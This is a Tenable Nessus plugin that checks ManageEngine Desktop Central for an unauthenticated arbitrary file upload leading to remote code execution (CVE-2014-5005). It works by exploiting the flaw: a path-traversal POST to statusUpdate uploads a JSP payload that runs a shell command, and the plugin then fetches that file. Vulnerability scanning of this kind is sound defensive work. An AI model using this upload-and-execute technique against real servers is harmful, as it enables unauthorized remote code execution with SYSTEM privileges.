#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(82078);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/05/16 14:02:53 $");

  script_cve_id("CVE-2014-5005");
  script_bugtraq_id(69494);
  script_osvdb_id(110643);
  script_xref(name:"EDB-ID", value:"34594");
  script_xref(name:"EDB-ID", value:"34518");

  script_name(english:"ManageEngine Desktop Central statusUpdate Arbitrary File Upload RCE (intrusive check)");
  script_summary(english:"Uploads a file to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java-based web application that is
affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of ManageEngine Desktop Central running on the remote host
is affected by a remote code execution vulnerability due to a failure
by the statusUpdate script to properly sanitize user-supplied input to
the 'fileName' parameter when performing an 'LFU' action to
statusUpdate. A remote, unauthenticated attacker can exploit this,
via a crafted 'dot dot' request, to upload to the remote host files
containing arbitrary code and then execute them with
NT-AUTHORITY\SYSTEM privileges.

Note that ManageEngine Desktop Central is reportedly affected by other
vulnerabilities as well, although Nessus has not tested for these.

Also note this plugin tries to upload a JSP file to <DocumentRoot>
(i.e., C:\ManageEngine\DesktopCentral_Server\webapps\DesktopCentral\)
and then fetch it, thus executing the Java code in the JSP file. The
plugin attempts to delete the JSP file after a successful upload and
fetch. The user is advised to delete the JSP file if Nessus fails to
delete it.");
# https://www.manageengine.com/products/desktop-central/remote-code-execution.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?89099720");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-15-006/");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2014/Aug/88");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine Desktop Central 9 build 90055 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"ManageEngine Desktop Central 9.0.0 File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'ManageEngine Desktop Central StatusUpdate Arbitrary File Upload');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/08/31");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/08/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/03/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_desktop_central");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("manageengine_desktop_central_detect.nbin","os_fingerprint.nasl");
  script_require_ports("Services/www", 8020, 8383, 8040);
  script_require_keys("installed_sw/ManageEngine Desktop Central");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

# ManageEngine Desktop Central (MEDC) server is known to be installed
# on Windows only.
# Skip non-Windows targets, but will continue if OS is not determined
os = get_kb_item("Host/OS");
if(os && "windows" >!< tolower(os))
  audit(AUDIT_OS_NOT, "Windows");

appname = "ManageEngine Desktop Central";
get_install_count(app_name:appname, exit_if_zero:TRUE);

port = get_http_port(default:8020);

install = get_single_install(
  app_name            : appname,
  port                : port
);

dir = install["path"];
install_url =  build_url(port:port, qs:dir);

file = SCRIPT_NAME - ".nasl" + '-' + port + ".jsp";

postdata =
  '<%@ page import="java.io.*" %>\n' +
  '<%\n' +
  'String output = "";\n' +
  'String s = null;\n' +
  '  try {\n' +
  '     Process p = Runtime.getRuntime().exec("cmd.exe /C ipconfig /all && del ..\\\\webapps\\\\DesktopCentral\\\\' + file + '");\n' +
  '      BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));\n' +
         'while((s = sI.readLine()) != null) {\n' +
         '  output += "\\n"+ s;\n' +
         '}\n' +
      '}\n' +
      'catch(IOException e) {\n' +
      '   e.printStackTrace();\n' +
      '}\n' +
  '%>\n' +
  '\n' +
  '<pre>\n <%=output %>\n </pre>\n';


url = dir + "/statusUpdate?" +
     "actionToCall=LFU&" + 
     "configDataID=1&" + 
     "computerName=NessusCheck&"+
     "domainName=NessusCheck&" +
     "customerId=1" +
     "&applicationName=../../../../../" +   
     "&fileName=" + file;

res = http_send_recv3(
  port            : port,
  method          : "POST",
  item            : url,
  data            : postdata,
  content_type    : "text/html",
  exit_on_fail    : TRUE
);

# Vulnerable server should return 200
if(res[0] !~ "^HTTP/[0-9.]+ 200")
{
  # Patched server returns 403
  if (res[0] =~ "^HTTP/[0-9.]+ 403")
  {
    audit(AUDIT_WEB_APP_NOT_AFFECTED, "ManageEngine Desktop Central", install_url);
  }
  # Unexpected
  else
  {
    audit(AUDIT_RESP_BAD, port, 'a status update message, return HTTP status: ' + res[0]);
  }
}

req1 = http_last_sent_request();

# Try and access our uploaded file
res2 = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/" + file,
  exit_on_fail : TRUE
);
req2 = http_last_sent_request();

if ("Subnet Mask" >< res2[2])
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    request    : make_list(req1,req2),
    output     : res2[2],
    generic    : TRUE
  );
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "ManageEngine Desktop Central", install_url);
